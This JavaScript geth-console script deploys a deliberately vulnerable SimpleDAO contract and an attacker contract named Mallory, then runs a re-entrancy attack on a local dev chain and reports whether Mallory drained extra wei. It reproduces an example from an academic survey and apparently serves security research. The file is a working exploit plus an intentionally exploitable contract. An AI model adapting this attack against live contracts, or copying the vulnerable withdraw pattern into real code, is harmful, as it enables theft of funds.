// Script for deploying and running a simple "same-function" re-entrancy attack against
// a crafted vulnerable contract (see simple.sol)
//
// Example taken from the paper by N. Atzei, M. Bartoletti, and T. Cimoli, “A Survey of Attacks on Ethereum Smart Contracts (SoK),” in Principles of Security and Trust, 2017
// http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao
//
// usage: first start geth in developer mode (no mining difficulty and
// prefundend accounts) and start the JavaScript console interface of geth:
//
// $ geth --dev --dev.period=1 console
//
// Then load this script to setup everything:
//
// > loadScript("simple_setup.js")
//
// Sometimes it takes a while for all contracts to be mined and commited to the
// dev blockchain. Manually creating more transactions helps. Simply type:
//
// > transferSomething()
//
// If both the Token and Mallory contracts have been mined, the attack can be
// started:
//
// > triggerAttack()
//
//
// Example:
//




console.log("\n=== Simple Re-Entrancy Attack Example ===\n")

console.log("creating/unlocking accounts");

var defaultPassword = "";

personal.newAccount(defaultPassword)
personal.newAccount(defaultPassword)
function unlockAllAccounts() {
  personal.unlockAccount(eth.accounts[0], defaultPassword)
  personal.unlockAccount(eth.accounts[1], defaultPassword)
  personal.unlockAccount(eth.accounts[2], defaultPassword)
}
unlockAllAccounts()

attacker = eth.accounts[2]
eth.sendTransaction({from: eth.accounts[0], to: attacker, value: 100000000000000000000000})
admin.sleepBlocks(3)
transferSomething()

function transferSomething() {
  // sometimes things are stuck for some reason
  eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[2], value: 100})
  admin.sleepBlocks(3)
}


console.log("[+] Deploying contracts")
var malloryContract = web3.eth.contract([{"constant":true,"inputs":[],"name":"dao","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"addr","type":"address"}],"name":"setDAO","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
var mallory = malloryContract.new(
   {
     from: attacker,
     data: '0x608060405234801561001057600080fd5b50610320806100206000396000f3fe608060405260043610610046576000357c0100000000000000000000000000000000000000000000000000000000900480634162169f146101e4578063e73a914c1461023b575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166359f1286d306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561013d57600080fd5b505afa158015610151573d6000803e3d6000fd5b505050506040513d602081101561016757600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156101ca57600080fd5b505af11580156101de573d6000803e3d6000fd5b50505050005b3480156101f057600080fd5b506101f961028c565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561024757600080fd5b5061028a6004803603602081101561025e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506102b1565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505056fea165627a7a72305820fd78428db45cd09abbd43a4cb556c92bcd0bb6d0d843088a7c00d8d9765089f60029',
     gas: '4700000'
   }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
         console.log('Mallory contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
    }
 })

var simpledaoContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"donate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"to","type":"address"}],"name":"queryCredit","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"credit","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]);
var simpledao = simpledaoContract.new(
   {
     from: web3.eth.accounts[0],
     data: '0x608060405234801561001057600080fd5b50610381806100206000396000f3fe60806040526004361061005b576000357c010000000000000000000000000000000000000000000000000000000090048062362a95146100605780632e1a7d4d146100a457806359f1286d146100df578063d5d44d8014610144575b600080fd5b6100a26004803603602081101561007657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506101a9565b005b3480156100b057600080fd5b506100dd600480360360208110156100c757600080fd5b81019080803590602001909291905050506101f8565b005b3480156100eb57600080fd5b5061012e6004803603602081101561010257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506102f5565b6040518082815260200191505060405180910390f35b34801561015057600080fd5b506101936004803603602081101561016757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061033d565b6040518082815260200191505060405180910390f35b346000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015156102f2573373ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d806000811461029d576040519150601f19603f3d011682016040523d82523d6000602084013e6102a2565b606091505b505050806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6000602052806000526040600020600091509050548156fea165627a7a7230582053094cf53a55dbe65e8ef04748d38963f03c795cdb0a4b40547d0f8feeb9229c0029',
     gas: '4700000'
   }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
         console.log('SimpleDAO contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
    }
 })

transferSomething()



transferSomething()
console.log("\n===============================================================================")
console.log("Wait for SimpleDAO and Mallory contracts to be mined.")
console.log("Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that Mallory and SimpleDAO contract are mined.")
transferSomething()
console.log("Use triggerAttack() to start the attack")
console.log("===============================================================================\n")


function setupInitialState() {
  transferSomething();

  console.log("[+] setting up initial state");

  var victimAmount = 10000;
  var malloryAmount = 10;
  console.log("donating " + victimAmount + " wei to victim on SimpleDAO");
  simpledao.donate(eth.accounts[0], {from: eth.accounts[0], value: victimAmount});
  console.log("donating " + malloryAmount + " wei to Mallory on SimpleDAO");
  simpledao.donate(mallory.address, {from: attacker, value: 10});

  console.log("setting Mallory's target");
  mallory.setDAO(simpledao.address, {from: attacker});

  transferSomething();
}

function printStatus() {
  console.log("");
  console.log("SimpleDAO has " + eth.getBalance(simpledao.address) + " wei");
  console.log("mallory   has " + eth.getBalance(mallory.address) + " wei");
  console.log("mallory   has " + simpledao.queryCredit(mallory.address) + " wei invested in SimpleDAO");
  console.log("");
}

function triggerAttack() {
  transferSomething();
  setupInitialState();
  transferSomething();

  var preBalance = eth.getBalance(mallory.address);

  printStatus();

  console.log("[+] starting attack");
  // we send one wei to mallory to start the attack
  var t = eth.sendTransaction({to: mallory.address, from: attacker, gas: '4700000', value: 1});
  transferSomething();

  printStatus();
  var gains = (eth.getBalance(mallory.address) - preBalance - 1);
  console.log("mallory gained " + gains + " wei");
  if (gains > 0) {
    console.log("attack status: SUCCESS");
  } else {
    console.log("attack status: FAIL");
  }

  // sereum only:
  //var r = debug.checkTransaction(t)
  //console.log("error: " + r.error)

  return t;
}


function getAttackTrace() {
  a = triggerAttack();
  return debug.traceTransaction(a);
}
